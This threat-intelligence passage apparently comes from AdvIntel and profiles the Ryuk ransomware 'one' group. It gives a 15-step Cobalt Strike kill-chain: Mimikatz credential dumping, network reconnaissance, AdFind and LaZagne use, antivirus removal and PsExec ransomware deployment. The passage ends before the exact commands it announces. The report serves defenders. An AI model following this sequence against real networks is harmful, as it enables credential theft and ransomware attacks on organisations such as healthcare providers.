An intimate look at the Ryuk "one" adversaries

1/8

During one routine AdvIntel incident response engagement and enhanced visibility, we were
able to obtain additional insights into the exact attack kill-chain executed by the Ryuk
ransomware “one” group via Cobalt Strike toolkit.

The group behind Ryuk ransomware distribution, referenced as "one" continues to target
various industries including healthcare relying on BazarBackdoor. Currently, the healthcare
and social services targeting comprises 13.36% of the total victim by industries.

The group behind prefers to leverage pentester toolkits favoriting Cobalt Strike beacon as an
immediate post-exploitation payload of choice. The additional open-source toolkits they rely
on are Mimikatz, PowerShell PowerSploit, LaZagne, AdFind, Bloodhound, and PsExec.

Here is the Cobalt Strike exploitation anatomy of the attack (AoA) exploitation of breach
group ("one") from one of the latest high-profile "Ryuk" ransomware victims in 15 steps
pivoted from the "BazarBackdoor" infection:

1. Examine domain admin via "Invoke-DACheck" script
2. Collect host passwords via Mimikatz "mimikatz's sekurlsa::logonpasswords"
3. Revert token and create a token for the administrative comment from the Mimikatz
command output
4. Review the network of the host via "net view"
5. Portscan for FTP, SSH, SMB, RDP, VNC protocols
3/8

6. List accesses on the available hosts
7. Upload active directory finder "AdFind" kit with the batch script "adf.bat" from the
"net view" and portscanned hosts
8. Display the antivirus name on the host via "WMIC" command
9. Upload multi-purpose password recovery tool "LaZagne" to scan the host
10. Remove the password recovery tool
11. Run ADFind and save outputs
12. Delete AdFind tool artifacts and download outputs
13. Grant net share full access to all for Ryuk ransomware
14. Upload remote execution software "PSExec" and prepared network hosts and
uninstall the anti-virus product
15. Upload execution batch scripts and the parsed network hosts and run Ryuk
ransomware as via PsExec under different compromised users

The full redacted anonymized description of the exact executed Cobalt Strike commands are
as follows leading to Ryuk ransomware:
